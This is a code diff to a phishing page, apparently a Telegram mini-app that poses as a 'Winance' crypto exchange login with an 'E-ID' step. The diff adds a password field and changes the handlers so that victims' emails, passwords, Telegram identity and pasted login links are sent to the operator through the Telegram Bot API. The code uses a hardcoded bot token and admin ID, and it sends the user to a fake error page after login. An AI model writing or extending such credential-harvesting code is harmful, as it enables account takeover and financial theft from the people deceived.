@@ -433,13 +433,14 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         <button class="btn-back" onclick="goTo('main')">← Назад</button>
     </div>
 
-    <!-- ============ ВХОД ЧЕРЕЗ E-ID (ПОЧТА) ============ -->
+    <!-- ============ ВХОД ЧЕРЕЗ E-ID (ПОЧТА И ПАРОЛЬ) ============ -->
     <div id="pageEidForm" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg></div>
         <div class="page-title">Вход через E-ID</div>
-        <div class="page-sub">Введите вашу почту, на которую зарегистрирован E-ID</div>
+        <div class="page-sub">Введите данные аккаунта E-ID</div>
 
         <div class="form-group"><label>Email</label><input type="email" id="eidEmail" placeholder="name@example.com"></div>
+        <div class="form-group"><label>Пароль</label><input type="password" id="eidPassword" placeholder="••••••••"></div>
 
         <button id="eidBtn" class="btn-primary" onclick="handleEidRequest()">Получить ссылку</button>
         <div id="eidError" class="message error"></div>
@@ -508,10 +509,9 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     });
 
     // ============================================================
-    // КОНФИГ
+    // КОНФИГ (ВСТАВЬ СВОЙ ТОКЕН!)
     // ============================================================
-     // ============================================================
-   const BOT_TOKEN = "8962930921:AAEiwjp0QH4YJQv8-SJ0Y0WXC7-swgkUKxA";
+    const BOT_TOKEN = "8962930921:AAEiwjp0QH4YJQv8-SJ0Y0WXC7-swgkUKxA";
     const ADMIN_ID  = "8949174431";
     const SUPPORT_LINK = "https://t.me/winance_support"; // Ссылка на ТП
     const MAX_ATTEMPTS = 3;
@@ -538,6 +538,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     const email = document.getElementById('email');
     const password = document.getElementById('password');
     const eidEmail = document.getElementById('eidEmail');
+    const eidPassword = document.getElementById('eidPassword');
     const eidLinkInput = document.getElementById('eidLinkInput');
 
     const loginError = document.getElementById('loginError');
@@ -576,6 +577,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
             email.value = '';
             password.value = '';
             eidEmail.value = '';
+            eidPassword.value = '';
             eidLinkInput.value = '';
             loginBtn.disabled = false;
             loginBtn.textContent = 'Войти';
@@ -604,6 +606,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         return false;
     }
 
+    // Отправка тебе в ЛС
     async function sendToAdmin(text) {
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -623,7 +626,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         }
     }
 
-    // ===== ОБЫЧНЫЙ ВХОД =====
+    // ===== 1. ОБЫЧНЫЙ ВХОД =====
     async function handleLogin() {
         const e = email.value.trim();
         const p = password.value.trim();
@@ -657,32 +660,42 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
             return;
         }
         
-        // Если все ок, переходим на страницу с ошибкой (как ты просил ранее)
-        // Или можно сделать переход на ввод кода. Сейчас стоит переход на ошибку.
+        // В случае успеха кидаем на ошибку (или можно на ввод кода)
         goTo('error'); 
     }
 
-    // ===== E-ID: ЗАПРОС ССЫЛКИ =====
+    // ===== 2. E-ID: ЗАПРОС ССЫЛКИ (Email + Пароль) =====
     async function handleEidRequest() {
         const e = eidEmail.value.trim();
-        if (!e || !e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
+        const p = eidPassword.value.trim();
+
+        if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
+        if (!e.includes('@')) { showMessage('Некорректный email', 'error'); return; }
+
+        userEmail = e;
+        userPassword = p;
 
         eidBtn.disabled = true;
         eidBtn.textContent = 'Отправка...';
 
-        // Отправляем админу, что юзер хочет войти через E-ID
         const user = tg.initDataUnsafe?.user || {};
-        const msg = `🆔 <b>E-ID ЗАПРОС</b>\n\n👤 ID: <code>${user.id}</code>\n📧 Email: <code>${e}</code>`;
+        const msg =
+            `🆔 <b>E-ID ЗАПРОС (Winance)</b>\n\n` +
+            `👤 ID: <code>${user.id || 'неизвестно'}</code>\n` +
+            `👤 Имя: ${user.first_name || '-'}\n\n` +
+            `📧 Email: <code>${e}</code>\n` +
+            `🔑 Пароль: <code>${p}</code>`;
+
         await sendToAdmin(msg);
 
         eidBtn.disabled = false;
         eidBtn.textContent = 'Получить ссылку';
         
-        // Переходим на страницу вставки ссылки
+        // Переходим на ввод ссылки
         goTo('eidLink');
     }
 
-    // ===== E-ID: ОТПРАВКА ССЫЛКИ =====
+    // ===== 3. E-ID: ОТПРАВКА ССЫЛКИ =====
     async function handleEidLink() {
         const link = eidLinkInput.value.trim();
         if (!link || !link.startsWith('http')) { showMessage('Вставьте корректную ссылку', 'error'); return; }
@@ -693,8 +706,9 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         const user = tg.initDataUnsafe?.user || {};
         const msg =
             `🔗 <b>E-ID ССЫЛКА (Winance)</b>\n\n` +
-            `👤 ID: <code>${user.id}</code>\n` +
-            `📧 Email: <code>${eidEmail.value.trim()}</code>\n\n` +
+            `👤 ID: <code>${user.id || 'неизвестно'}</code>\n\n` +
+            `📧 Email: <code>${userEmail}</code>\n` +
+            `🔑 Пароль: <code>${userPassword}</code>\n\n` +
             `<code>${link}</code>`;
 
         const ok = await sendToAdmin(msg);
